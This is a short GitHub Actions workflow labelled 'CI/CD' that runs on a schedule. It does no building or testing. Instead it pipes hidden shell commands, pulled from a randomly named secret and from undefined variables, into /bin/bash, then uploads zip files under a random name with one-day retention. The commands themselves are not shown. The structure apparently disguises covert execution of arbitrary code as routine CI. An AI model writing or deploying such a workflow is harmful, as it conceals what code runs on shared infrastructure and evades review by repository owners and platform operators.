name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '48 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Invoke
        env:
          qgqey18: ${{ secrets.qgqey18 }}
        run: |
          printf '%s' "$qgqey18" | jq -r .p12 | /bin/bash
          echo $mpff6245 | jq -r .lihh97136 | /bin/bash
          printf '%s' "$gx96" | jq -r .gnvs7 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 2rr9PzGw
          path: "*.zip"
          retention-days: 1
